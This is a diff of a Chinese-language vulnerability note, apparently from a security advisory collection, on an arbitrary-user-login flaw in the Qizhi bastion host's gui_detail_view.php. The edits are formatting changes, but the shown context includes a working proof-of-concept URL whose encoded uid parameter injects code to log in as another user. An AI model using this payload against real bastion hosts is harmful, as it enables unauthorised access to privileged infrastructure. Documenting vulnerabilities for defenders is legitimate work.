@@ -1,4 +1,4 @@
-# 齐治堡垒机 gui_detail_view.php 任意用户登录漏洞
+# 齐治堡垒机 gui\_detail\_view.php 任意用户登录漏洞
 
 ## 漏洞描述
 
@@ -20,12 +20,10 @@ app="齐治科技-堡垒机"
 
 漏洞POC为
 
-```plain
+```
 http://xxx.xxx.xxx.xxx/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm
 ```
 
+![](../.gitbook/assets/202202101931947.png)
 
-
-![](images/202202101931947.png)
-
-## 
+##
